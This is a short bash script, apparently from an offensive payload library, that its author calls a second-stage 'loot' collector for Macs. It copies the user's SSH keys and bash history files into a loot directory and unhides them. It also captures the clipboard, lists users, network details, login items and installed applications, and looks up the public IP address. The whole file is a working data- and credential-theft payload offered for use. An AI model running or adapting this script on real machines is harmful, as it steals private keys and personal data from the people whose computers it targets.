#!/bin/bash
#
# This is a sample second-stage script. It will scrape some interesting
# information from a mac. The target loot directory is passed in as $1
# I have added echo statements for each command to make it easier to parse
# STDOUT when viewing loot afterwards. 

echo "$ whoami"
whoami

echo "$ uname -a"
uname -a

echo "$ df -h"
df -h

echo "$ ls ~"
ls -alF ~

echo "$ cd ${1}"
cd $1

echo "$ cp -r ~/.ssh ssh"
cp -r ~/.ssh $1/ssh

echo "$ cp -r ~/.bash* ."
cp -r ~/.bash* $1/.

echo "for file in .*; do"
for file in .*; do
	# Skip "." and ".." and unhide every hidden file
	if [[ "${file}" =~ ^\.*$ ]]; then
		echo "Skip \"${file}\""
	else
		echo "mv ${file} ${file#.}"
		mv "$file" "${file#.}"
	fi
done
echo "done"

# Lifted from library/recon/MacProfiler
echo "$ history"
history

echo "$ osascript -e \"the clipboard\" > clipboard.txt"
osascript -e "the clipboard" > clipboard.txt

echo "$ dscl . list /Users | grep -v '_'"
dscl . list /Users | grep -v '_'

echo "$ ifconfig"
ifconfig

echo "$ curl ipecho.net/plain"
curl ipecho.net/plain

echo "$ osascript -e 'tell application \"System Events\" to get the name of every login item'"
osascript -e 'tell application "System Events" to get the name of every login item'

echo "$ ls /Applications/"
ls /Applications/
